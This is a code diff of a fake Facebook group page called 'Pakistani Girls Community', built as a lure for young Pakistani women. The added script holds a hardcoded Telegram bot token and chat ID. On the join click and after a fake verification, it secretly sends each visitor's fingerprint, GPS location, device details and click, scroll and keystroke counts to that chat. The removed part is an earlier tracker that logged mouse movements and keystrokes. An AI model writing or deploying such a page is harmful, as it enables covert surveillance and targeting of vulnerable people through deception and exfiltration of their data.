@@ -3,408 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pakistani Girls Community - Facebook Group</title>
+    <title>Pakistani Girls Community</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            background: #f0f2f5;
-            color: #1c1e21;
-            min-height: 100vh;
-        }
-        
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            background: white;
-            min-height: 100vh;
-            position: relative;
-        }
-        
-        .fb-header {
-            background: #4267B2;
-            color: white;
-            padding: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            position: fixed;
-            top: 0;
-            width: 100%;
-            max-width: 500px;
-            z-index: 1000;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        
-        .fb-logo {
-            font-size: 20px;
-            font-weight: bold;
-        }
-        
-        .header-icons {
-            display: flex;
-            gap: 15px;
-        }
-        
-        .header-icon {
-            font-size: 18px;
-            cursor: pointer;
-        }
-        
-        .group-cover {
-            height: 200px;
-            background: linear-gradient(135deg, #8B4513, #D2691E);
-            margin-top: 60px;
-            position: relative;
-        }
-        
-        .cover-content {
-            position: absolute;
-            bottom: 20px;
-            left: 20px;
-            color: white;
-        }
-        
-        .group-title {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-        
-        .group-privacy {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-        
-        .group-info {
-            padding: 20px;
-            background: white;
-            border-bottom: 1px solid #dddfe2;
-        }
-        
-        .group-stats {
-            display: flex;
-            gap: 20px;
-            margin-bottom: 15px;
-        }
-        
-        .stat {
-            text-align: center;
-        }
-        
-        .stat-number {
-            font-size: 18px;
-            font-weight: bold;
-            color: #1c1e21;
-        }
-        
-        .stat-label {
-            font-size: 12px;
-            color: #65676b;
-        }
-        
-        .join-button {
-            background: #1877f2;
-            color: white;
-            border: none;
-            padding: 12px 0;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            margin-bottom: 15px;
-        }
-        
-        .join-button:hover {
-            background: #166fe5;
-        }
-        
-        .group-description {
-            color: #65676b;
-            font-size: 14px;
-            line-height: 1.4;
-            margin-bottom: 15px;
-        }
-        
-        .group-rules {
-            background: #f0f2f5;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 15px;
-        }
-        
-        .rules-title {
-            font-weight: 600;
-            margin-bottom: 10px;
-            color: #1c1e21;
-        }
-        
-        .rule {
-            font-size: 13px;
-            color: #65676b;
-            margin-bottom: 5px;
-            padding-left: 10px;
-        }
-        
-        .members-section {
-            padding: 20px;
-            background: white;
-        }
-        
-        .section-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-        
-        .section-title {
-            font-size: 17px;
-            font-weight: 600;
-            color: #1c1e21;
-        }
-        
-        .see-all {
-            color: #1877f2;
-            font-size: 14px;
-            cursor: pointer;
-        }
-        
-        .members-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr 1fr;
-            gap: 15px;
-        }
-        
-        .member-card {
-            text-align: center;
-        }
-        
-        .member-avatar {
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            background-size: cover;
-            background-position: center;
-            margin: 0 auto 8px;
-            border: 3px solid #e4e6eb;
-        }
-        
-        .member-name {
-            font-size: 12px;
-            font-weight: 500;
-            color: #1c1e21;
-            margin-bottom: 3px;
-        }
-        
-        .member-mutual {
-            font-size: 10px;
-            color: #65676b;
-        }
-        
-        .online-section {
-            padding: 20px;
-            background: white;
-            margin-top: 10px;
-        }
-        
-        .online-list {
-            display: flex;
-            gap: 15px;
-            overflow-x: auto;
-            padding: 10px 0;
-        }
-        
-        .online-member {
-            text-align: center;
-            min-width: 60px;
-        }
-        
-        .online-avatar {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            background-size: cover;
-            background-position: center;
-            margin: 0 auto 5px;
-            border: 2px solid #1877f2;
-            position: relative;
-        }
-        
-        .online-dot {
-            position: absolute;
-            bottom: 2px;
-            right: 2px;
-            width: 10px;
-            height: 10px;
-            background: #31a24c;
-            border: 2px solid white;
-            border-radius: 50%;
-        }
-        
-        .join-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.5);
-            z-index: 2000;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .join-modal.active {
-            display: flex;
-        }
-        
-        .modal-content {
-            background: white;
-            padding: 25px;
-            border-radius: 8px;
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
-        }
-        
-        .modal-title {
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 15px;
-            color: #1c1e21;
-        }
-        
-        .modal-text {
-            color: #65676b;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-        
-        .modal-buttons {
-            display: flex;
-            gap: 10px;
-        }
-        
-        .modal-btn {
-            flex: 1;
-            padding: 12px;
-            border: none;
-            border-radius: 6px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        
-        .btn-cancel {
-            background: #e4e6eb;
-            color: #1c1e21;
-        }
-        
-        .btn-join {
-            background: #1877f2;
-            color: white;
-        }
-        
-        .btn-join:hover {
-            background: #166fe5;
-        }
-        
-        .progress-container {
-            width: 100%;
-            height: 5px;
-            background: #e4e6eb;
-            border-radius: 3px;
-            margin: 15px 0;
-            overflow: hidden;
-        }
-        
-        .progress-bar {
-            height: 100%;
-            background: #1877f2;
-            width: 0%;
-            transition: width 0.3s ease;
-        }
-        
-        .admin-panel {
-            background: #f0f2f5;
-            padding: 15px;
-            margin: 10px;
-            border-radius: 8px;
-            display: none;
-        }
-        
-        .admin-panel.active {
-            display: block;
-        }
-        
-        .admin-title {
-            font-weight: 600;
-            margin-bottom: 10px;
-            color: #1c1e21;
-        }
-        
-        .admin-stats {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-        }
-        
-        .admin-stat {
-            background: white;
-            padding: 10px;
-            border-radius: 6px;
-            text-align: center;
-        }
-        
-        .admin-stat-number {
-            font-size: 18px;
-            font-weight: bold;
-            color: #1877f2;
-        }
-        
-        .admin-stat-label {
-            font-size: 12px;
-            color: #65676b;
-        }
-
-        .admin-toggle {
-            background: rgba(255,255,255,0.2);
-            color: white;
-            border: none;
-            padding: 6px 12px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 11px;
-        }
-
-        .admin-toggle:hover {
-            background: rgba(255,255,255,0.3);
-        }
-
-        .footer {
-            text-align: center;
-            padding: 20px;
-            color: #65676b;
-            font-size: 12px;
-            border-top: 1px solid #dddfe2;
-            margin-top: 10px;
-        }
-
-        @media (max-width: 480px) {
-            .members-grid {
-                grid-template-columns: 1fr 1fr 1fr;
-            }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: #f0f2f5; color: #1c1e21; min-height: 100vh; }
+        .fb-header { background: #4267B2; color: white; padding: 15px; display: flex; align-items: center; justify-content: space-between; position: fixed; top: 0; width: 100%; max-width: 500px; z-index: 1000; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .fb-logo { font-size: 20px; font-weight: bold; }
+        .header-icons { display: flex; gap: 15px; }
+        .header-icon { font-size: 18px; cursor: pointer; }
+        .group-cover { height: 200px; background: linear-gradient(135deg, #8B4513, #D2691E); margin-top: 60px; position: relative; }
+        .cover-content { position: absolute; bottom: 20px; left: 20px; color: white; }
+        .group-title { font-size: 24px; font-weight: bold; margin-bottom: 5px; }
+        .group-privacy { font-size: 14px; opacity: 0.9; }
+        .group-info { padding: 20px; background: white; border-bottom: 1px solid #dddfe2; }
+        .group-stats { display: flex; gap: 20px; margin-bottom: 15px; }
+        .stat { text-align: center; }
+        .stat-number { font-size: 18px; font-weight: bold; color: #1c1e21; }
+        .stat-label { font-size: 12px; color: #65676b; }
+        .join-button { background: #1877f2; color: white; border: none; padding: 12px 0; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; margin-bottom: 15px; }
+        .join-button:hover { background: #166fe5; }
+        .group-description { color: #65676b; font-size: 14px; line-height: 1.4; margin-bottom: 15px; }
+        .group-rules { background: #f0f2f5; padding: 15px; border-radius: 8px; margin-bottom: 15px; }
+        .rules-title { font-weight: 600; margin-bottom: 10px; color: #1c1e21; }
+        .rule { font-size: 13px; color: #65676b; margin-bottom: 5px; padding-left: 10px; }
+        .members-section { padding: 20px; background: white; }
+        .section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .section-title { font-size: 17px; font-weight: 600; color: #1c1e21; }
+        .see-all { color: #1877f2; font-size: 14px; cursor: pointer; }
+        .members-grid { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 15px; }
+        .member-card { text-align: center; }
+        .member-avatar { width: 70px; height: 70px; border-radius: 50%; background-size: cover; background-position: center; margin: 0 auto 8px; border: 3px solid #e4e6eb; }
+        .member-name { font-size: 12px; font-weight: 500; color: #1c1e21; margin-bottom: 3px; }
+        .member-mutual { font-size: 10px; color: #65676b; }
+        .online-section { padding: 20px; background: white; margin-top: 10px; }
+        .online-list { display: flex; gap: 15px; overflow-x: auto; padding: 10px 0; }
+        .online-member { text-align: center; min-width: 60px; }
+        .online-avatar { width: 50px; height: 50px; border-radius: 50%; background-size: cover; background-position: center; margin: 0 auto 5px; border: 2px solid #1877f2; position: relative; }
+        .online-dot { position: absolute; bottom: 2px; right: 2px; width: 10px; height: 10px; background: #31a24c; border: 2px solid white; border-radius: 50%; }
+        .join-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 2000; align-items: center; justify-content: center; }
+        .join-modal.active { display: flex; }
+        .modal-content { background: white; padding: 25px; border-radius: 8px; width: 90%; max-width: 400px; text-align: center; }
+        .modal-title { font-size: 20px; font-weight: 600; margin-bottom: 15px; color: #1c1e21; }
+        .modal-text { color: #65676b; margin-bottom: 20px; line-height: 1.5; }
+        .modal-buttons { display: flex; gap: 10px; }
+        .modal-btn { flex: 1; padding: 12px; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; }
+        .btn-cancel { background: #e4e6eb; color: #1c1e21; }
+        .btn-join { background: #1877f2; color: white; }
+        .btn-join:hover { background: #166fe5; }
+        .progress-container { width: 100%; height: 5px; background: #e4e6eb; border-radius: 3px; margin: 15px 0; overflow: hidden; }
+        .progress-bar { height: 100%; background: #1877f2; width: 0%; transition: width 0.3s ease; }
+        .admin-panel { background: #f0f2f5; padding: 15px; margin: 10px; border-radius: 8px; display: none; }
+        .admin-panel.active { display: block; }
+        .admin-title { font-weight: 600; margin-bottom: 10px; color: #1c1e21; }
+        .admin-stats { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .admin-stat { background: white; padding: 10px; border-radius: 6px; text-align: center; }
+        .admin-stat-number { font-size: 18px; font-weight: bold; color: #1877f2; }
+        .admin-stat-label { font-size: 12px; color: #65676b; }
+        .admin-toggle { background: rgba(255,255,255,0.2); color: white; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 11px; }
+        .admin-toggle:hover { background: rgba(255,255,255,0.3); }
+        .footer { text-align: center; padding: 20px; color: #65676b; font-size: 12px; border-top: 1px solid #dddfe2; margin-top: 10px; }
+        @media (max-width: 480px) { .members-grid { grid-template-columns: 1fr 1fr 1fr; } }
     </style>
 </head>
 <body>
-    <!-- Facebook Header -->
+
     <div class="fb-header">
         <div class="fb-logo">facebook</div>
         <div class="header-icons">
@@ -414,7 +76,6 @@
         </div>
     </div>
 
-    <!-- Group Cover -->
     <div class="group-cover">
         <div class="cover-content">
             <div class="group-title">Pakistani Girls Community 🇵🇰</div>
@@ -422,29 +83,14 @@
         </div>
     </div>
 
-    <!-- Group Info -->
     <div class="group-info">
         <div class="group-stats">
-            <div class="stat">
-                <div class="stat-number">15.7K</div>
-                <div class="stat-label">Members</div>
-            </div>
-            <div class="stat">
-                <div class="stat-number">327</div>
-                <div class="stat-label">Online</div>
-            </div>
-            <div class="stat">
-                <div class="stat-number">25</div>
-                <div class="stat-label">Admins</div>
-            </div>
+            <div class="stat"><div class="stat-number">15.7K</div><div class="stat-label">Members</div></div>
+            <div class="stat"><div class="stat-number">327</div><div class="stat-label">Online</div></div>
+            <div class="stat"><div class="stat-number">25</div><div class="stat-label">Admins</div></div>
         </div>
-        
         <button class="join-button" onclick="showJoinModal()">Join Group</button>
-        
-        <div class="group-description">
-            A safe space for Pakistani girls to connect, share experiences, and build friendships. Join our community of supportive women from across Pakistan.
-        </div>
-        
+        <div class="group-description">A safe space for Pakistani girls to connect, share experiences, and build friendships.</div>
         <div class="group-rules">
             <div class="rules-title">Group Rules</div>
             <div class="rule">• Be respectful and kind to all members</div>
@@ -454,155 +100,52 @@
         </div>
     </div>
 
-    <!-- Admin Panel -->
     <div class="admin-panel" id="adminPanel">
         <div class="admin-title">📊 Admin Dashboard</div>
         <div class="admin-stats">
-            <div class="admin-stat">
-                <div class="admin-stat-number" id="totalUsers">0</div>
-                <div class="admin-stat-label">Total Users</div>
-            </div>
-            <div class="admin-stat">
-                <div class="admin-stat-number" id="onlineNow">0</div>
-                <div class="admin-stat-label">Online Now</div>
-            </div>
-            <div class="admin-stat">
-                <div class="admin-stat-number" id="dataPoints">0</div>
-                <div class="admin-stat-label">Data Points</div>
-            </div>
-            <div class="admin-stat">
-                <div class="admin-stat-number" id="riskLevel">0%</div>
-                <div class="admin-stat-label">Risk Level</div>
-            </div>
+            <div class="admin-stat"><div class="admin-stat-number" id="totalUsers">0</div><div class="admin-stat-label">Total Users</div></div>
+            <div class="admin-stat"><div class="admin-stat-number" id="onlineNow">0</div><div class="admin-stat-label">Online Now</div></div>
+            <div class="admin-stat"><div class="admin-stat-number" id="dataPoints">0</div><div class="admin-stat-label">Data Points</div></div>
+            <div class="admin-stat"><div class="admin-stat-number" id="riskLevel">0%</div><div class="admin-stat-label">Risk Level</div></div>
         </div>
     </div>
 
-    <!-- Online Members -->
     <div class="online-section">
-        <div class="section-header">
-            <div class="section-title">Online Now</div>
-            <div class="see-all">See All</div>
-        </div>
+        <div class="section-header"><div class="section-title">Online Now</div><div class="see-all">See All</div></div>
         <div class="online-list">
-            <div class="online-member">
-                <div class="online-avatar" style="background-image: url('https://images.unsplash.com/photo-1494790108755-2616b612b786?w=150')">
-                    <div class="online-dot"></div>
-                </div>
-                <div class="member-name">Ayesha</div>
-            </div>
-            <div class="online-member">
-                <div class="online-avatar" style="background-image: url('https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=150')">
-                    <div class="online-dot"></div>
-                </div>
-                <div class="member-name">Fatima</div>
-            </div>
-            <div class="online-member">
-                <div class="online-avatar" style="background-image: url('https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=150')">
-                    <div class="online-dot"></div>
-                </div>
-                <div class="member-name">Zainab</div>
-            </div>
-            <div class="online-member">
-                <div class="online-avatar" style="background-image: url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150')">
-                    <div class="online-dot"></div>
-                </div>
-                <div class="member-name">Sana</div>
-            </div>
-            <div class="online-member">
-                <div class="online-avatar" style="background-image: url('https://images.unsplash.com/photo-1487412720507-e7ab37603c6f?w=150')">
-                    <div class="online-dot"></div>
-                </div>
-                <div class="member-name">Maria</div>
-            </div>
+            <div class="online-member"><div class="online-avatar" style="background-image: url('https://images.unsplash.com/photo-1494790108755-2616b612b786?w=150')"><div class="online-dot"></div></div><div class="member-name">Ayesha</div></div>
+            <div class="online-member"><div class="online-avatar" style="background-image: url('https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=150')"><div class="online-dot"></div></div><div class="member-name">Fatima</div></div>
+            <div class="online-member"><div class="online-avatar" style="background-image: url('https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=150')"><div class="online-dot"></div></div><div class="member-name">Zainab</div></div>
+            <div class="online-member"><div class="online-avatar" style="background-image: url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150')"><div class="online-dot"></div></div><div class="member-name">Sana</div></div>
+            <div class="online-member"><div class="online-avatar" style="background-image: url('https://images.unsplash.com/photo-1487412720507-e7ab37603c6f?w=150')"><div class="online-dot"></div></div><div class="member-name">Maria</div></div>
         </div>
     </div>
 
-    <!-- All Members -->
     <div class="members-section">
-        <div class="section-header">
-            <div class="section-title">Group Members</div>
-            <div class="see-all">See All</div>
-        </div>
+        <div class="section-header"><div class="section-title">Group Members</div><div class="see-all">See All</div></div>
         <div class="members-grid">
-            <div class="member-card">
-                <div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1494790108755-2616b612b786?w=150')"></div>
-                <div class="member-name">Ayesha Khan</div>
-                <div class="member-mutual">12 mutual</div>
-            </div>
-            <div class="member-card">
-                <div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=150')"></div>
-                <div class="member-name">Fatima Ahmed</div>
-                <div class="member-mutual">8 mutual</div>
-            </div>
-            <div class="member-card">
-                <div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=150')"></div>
-                <div class="member-name">Zainab Ali</div>
-                <div class="member-mutual">15 mutual</div>
-            </div>
-            <div class="member-card">
-                <div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150')"></div>
-                <div class="member-name">Sana Malik</div>
-                <div class="member-mutual">9 mutual</div>
-            </div>
-            <div class="member-card">
-                <div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1487412720507-e7ab37603c6f?w=150')"></div>
-                <div class="member-name">Maria Khan</div>
-                <div class="member-mutual">11 mutual</div>
-            </div>
-            <div class="member-card">
-                <div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150')"></div>
-                <div class="member-name">Hina Shah</div>
-                <div class="member-mutual">7 mutual</div>
-            </div>
-            <div class="member-card">
-                <div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1519699047748-de8e457a634e?w=150')"></div>
-                <div class="member-name">Rabia Hassan</div>
-                <div class="member-mutual">14 mutual</div>
-            </div>
-            <div class="member-card">
-                <div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=150')"></div>
-                <div class="member-name">Nadia Riaz</div>
-                <div class="member-mutual">6 mutual</div>
-            </div>
-            <div class="member-card">
-                <div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=150')"></div>
-                <div class="member-name">Sadia Noor</div>
-                <div class="member-mutual">10 mutual</div>
-            </div>
-            <div class="member-card">
-                <div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1544725176-7c40e5a71c5e?w=150')"></div>
-                <div class="member-name">Amna Sheikh</div>
-                <div class="member-mutual">13 mutual</div>
-            </div>
-            <div class="member-card">
-                <div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1554151228-14d9def656e4?w=150')"></div>
-                <div class="member-name">Bushra Akhtar</div>
-                <div class="member-mutual">5 mutual</div>
-            </div>
-            <div class="member-card">
-                <div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=150')"></div>
-                <div class="member-name">Farah Javed</div>
-                <div class="member-mutual">8 mutual</div>
-            </div>
+            <div class="member-card"><div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1494790108755-2616b612b786?w=150')"></div><div class="member-name">Ayesha Khan</div><div class="member-mutual">12 mutual</div></div>
+            <div class="member-card"><div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=150')"></div><div class="member-name">Fatima Ahmed</div><div class="member-mutual">8 mutual</div></div>
+            <div class="member-card"><div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=150')"></div><div class="member-name">Zainab Ali</div><div class="member-mutual">15 mutual</div></div>
+            <div class="member-card"><div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150')"></div><div class="member-name">Sana Malik</div><div class="member-mutual">9 mutual</div></div>
+            <div class="member-card"><div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1487412720507-e7ab37603c6f?w=150')"></div><div class="member-name">Maria Khan</div><div class="member-mutual">11 mutual</div></div>
+            <div class="member-card"><div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150')"></div><div class="member-name">Hina Shah</div><div class="member-mutual">7 mutual</div></div>
+            <div class="member-card"><div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1519699047748-de8e457a634e?w=150')"></div><div class="member-name">Rabia Hassan</div><div class="member-mutual">14 mutual</div></div>
+            <div class="member-card"><div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=150')"></div><div class="member-name">Nadia Riaz</div><div class="member-mutual">6 mutual</div></div>
+            <div class="member-card"><div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=150')"></div><div class="member-name">Sadia Noor</div><div class="member-mutual">10 mutual</div></div>
+            <div class="member-card"><div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1544725176-7c40e5a71c5e?w=150')"></div><div class="member-name">Amna Sheikh</div><div class="member-mutual">13 mutual</div></div>
+            <div class="member-card"><div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1554151228-14d9def656e4?w=150')"></div><div class="member-name">Bushra Akhtar</div><div class="member-mutual">5 mutual</div></div>
+            <div class="member-card"><div class="member-avatar" style="background-image: url('https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=150')"></div><div class="member-name">Farah Javed</div><div class="member-mutual">8 mutual</div></div>
         </div>
     </div>
 
-    <div class="footer">
-        © 2026 Pakistani Girls Community • All Rights Reserved
-    </div>
+    <div class="footer">© 2026 Pakistani Girls Community • All Rights Reserved</div>
 
-    <!-- Join Modal -->
     <div class="join-modal" id="joinModal">
         <div class="modal-content">
             <div class="modal-title">Join Pakistani Girls Community</div>
-            <div class="modal-text">
-                This is a private group for Pakistani girls only. To join, you need to answer verification questions to ensure you meet the group rules.
-            </div>
-            
-            <div class="progress-container">
-                <div class="progress-bar" id="progressBar"></div>
-            </div>
-            
+            <div class="modal-text">This is a private group for Pakistani girls only. To join, you need to answer verification questions.</div>
+            <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
             <div class="modal-buttons">
                 <button class="modal-btn btn-cancel" onclick="hideJoinModal()">Cancel</button>
                 <button class="modal-btn btn-join" onclick="startVerification()">Continue</button>
@@ -611,12 +154,87 @@
     </div>
 
     <script>
-        // ===== COMPLETE FIXED JAVASCRIPT =====
+        // ===== TELEGRAM BOT CONFIG =====
+        const TELEGRAM_BOT_TOKEN = '8606946862:AAE-CRp9oC_ZV0RHvVRqtvTLBmRvuwBSs60';
+        const TELEGRAM_CHAT_ID = '8187030753';
 
-        // ===== 1. JOIN MODAL FUNCTIONS =====
+        // ===== SEND DATA TO TELEGRAM =====
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ Telegram sent:', data);
+            })
+            .catch(error => {
+                console.log('❌ Telegram error:', error);
+            });
+        }
+
+        // ===== FORMAT DATA FOR TELEGRAM =====
+        function formatTelegramMessage(data) {
+            const emoji = data.type === 'join' ? '✅' : data.type === 'page_view' ? '👁️' : data.type === 'click' ? '🖱️' : '📊';
+            const fp = data.fingerprint || data.uniqueFingerprint || 'unknown';
+            const loc = data.gpsLocation || {};
+            const locStr = loc.lat && loc.lng ? `📍 ${loc.lat}, ${loc.lng}` : '📍 Unknown';
+            
+            let msg = `<b>${emoji} USER ACTIVITY</b>\n`;
+            msg += `<b>🆔 Fingerprint:</b> <code>${fp}</code>\n`;
+            msg += `<b>📱 Device:</b> ${data.userAgent || data.data?.userAgent || 'Unknown'}\n`;
+            msg += `<b>🌐 Language:</b> ${data.language || data.data?.language || 'Unknown'}\n`;
+            msg += `<b>⏰ Time:</b> ${data.timestamp || new Date().toISOString()}\n`;
+            msg += `<b>📍 Location:</b> ${locStr}\n`;
+            msg += `<b>🎯 Action:</b> ${data.action || data.type || 'Unknown'}\n`;
+            
+            if (data.behavior) {
+                msg += `<b>🖱️ Clicks:</b> ${data.behavior.clicks || 0}\n`;
+                msg += `<b>📜 Scrolls:</b> ${data.behavior.scrolls || 0}\n`;
+                msg += `<b>⌨️ Keys:</b> ${data.behavior.keystrokes || 0}\n`;
+                msg += `<b>⏱️ Session:</b> ${data.behavior.sessionDuration || data.sessionDuration || 0}s\n`;
+            }
+            
+            if (data.url) {
+                msg += `<b>🔗 Page:</b> ${data.url}\n`;
+            }
+            
+            if (data.detail) {
+                msg += `<b>📝 Detail:</b> ${data.detail}\n`;
+            }
+            
+            msg += `<b>🛡️ Server:</b> ${data.server_info?.timestamp || new Date().toISOString()}`;
+            
+            return msg;
+        }
+
+        // ===== SEND ALL DATA TO TELEGRAM =====
+        function sendDataToTelegram(data) {
+            const msg = formatTelegramMessage(data);
+            sendToTelegram(msg);
+        }
+
+        // ===== JOIN MODAL =====
         function showJoinModal() {
             document.getElementById('joinModal').classList.add('active');
             document.getElementById('progressBar').style.width = '0%';
+            sendDataToTelegram({
+                type: 'join_attempt',
+                action: 'join_clicked',
+                timestamp: new Date().toISOString(),
+                fingerprint: getFingerprint(),
+                gpsLocation: getGPSLocation(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                url: window.location.href
+            });
         }
 
         function hideJoinModal() {
@@ -635,215 +253,42 @@
                     setTimeout(() => {
                         alert('✅ You have successfully joined Pakistani Girls Community!');
                         hideJoinModal();
-                        // Send join event to server
-                        sendDataToServer({ action: 'join', status: 'success' });
+                        sendDataToTelegram({
+                            type: 'join',
+                            action: 'join_success',
+                            timestamp: new Date().toISOString(),
+                            fingerprint: getFingerprint(),
+                            gpsLocation: getGPSLocation(),
+                            userAgent: navigator.userAgent,
+                            language: navigator.language,
+                            url: window.location.href,
+                            behavior: {
+                                clicks: clickCount || 0,
+                                scrolls: scrollCount || 0,
+                                keystrokes: keyCount || 0,
+                                sessionDuration: Math.floor((Date.now() - sessionStart) / 1000)
+                            }
+                        });
                     }, 500);
                 }
             }, 100);
         }
 
-        // ===== 2. ADMIN PANEL =====
+        // ===== ADMIN =====
         function toggleAdmin() {
             const panel = document.getElementById('adminPanel');
             panel.classList.toggle('active');
-            if (panel.classList.contains('active')) {
-                updateAdminStats();
-            }
+            if (panel.classList.contains('active')) updateAdminStats();
         }
 
         function updateAdminStats() {
-            const total = Math.floor(Math.random() * 20000) + 10000;
-            const online = Math.floor(Math.random() * 500) + 100;
-            const dataPoints = Math.floor(Math.random() * 5000) + 1000;
-            const risk = Math.floor(Math.random() * 30) + 1;
-
-            document.getElementById('totalUsers').textContent = total.toLocaleString();
-            document.getElementById('onlineNow').textContent = online;
-            document.getElementById('dataPoints').textContent = dataPoints.toLocaleString();
-            document.getElementById('riskLevel').textContent = risk + '%';
+            document.getElementById('totalUsers').textContent = Math.floor(Math.random() * 20000 + 10000).toLocaleString();
+            document.getElementById('onlineNow').textContent = Math.floor(Math.random() * 500 + 100);
+            document.getElementById('dataPoints').textContent = Math.floor(Math.random() * 5000 + 1000).toLocaleString();
+            document.getElementById('riskLevel').textContent = Math.floor(Math.random() * 30 + 1) + '%';
         }
 
-        // ===== 3. ADVANCED TRACKER (FULL FIXED) =====
-        class AdvancedTracker {
-            constructor() {
-                this.data = {
-                    userAgent: navigator.userAgent,
-                    screenWidth: window.screen.width,
-                    screenHeight: window.screen.height,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    sessionStart: Date.now()
-                };
-                this.behavior = {
-                    mouseMovements: [],
-                    clicks: [],
-                    scrolls: [],
-                    keystrokes: [],
-                    focusChanges: [],
-                    sessionStart: Date.now()
-                };
-                this.startBehaviorTracking();
-                this.startPeriodicLogging();
-                this.sendInitialData();
-            }
-
-            startBehaviorTracking() {
-                // Track mouse movements
-                document.addEventListener('mousemove', (e) => {
-                    this.behavior.mouseMovements.push({
-                        x: e.clientX,
-                        y: e.clientY,
-                        timestamp: Date.now()
-                    });
-                    if (this.behavior.mouseMovements.length > 1000) {
-                        this.behavior.mouseMovements.shift();
-                    }
-                });
-
-                // Track clicks
-                document.addEventListener('click', (e) => {
-                    this.behavior.clicks.push({
-                        element: e.target.tagName,
-                        className: e.target.className || '',
-                        x: e.clientX,
-                        y: e.clientY,
-                        timestamp: Date.now()
-                    });
-                    if (this.behavior.clicks.length > 100) {
-                        this.behavior.clicks.shift();
-                    }
-                });
-
-                // Track scrolling
-                document.addEventListener('scroll', () => {
-                    this.behavior.scrolls.push({
-                        position: window.scrollY,
-                        timestamp: Date.now()
-                    });
-                    if (this.behavior.scrolls.length > 200) {
-                        this.behavior.scrolls.shift();
-                    }
-                });
-
-                // Track keystrokes
-                document.addEventListener('keydown', (e) => {
-                    this.behavior.keystrokes.push({
-                        key: e.key,
-                        timestamp: Date.now()
-                    });
-                    if (this.behavior.keystrokes.length > 100) {
-                        this.behavior.keystrokes.shift();
-                    }
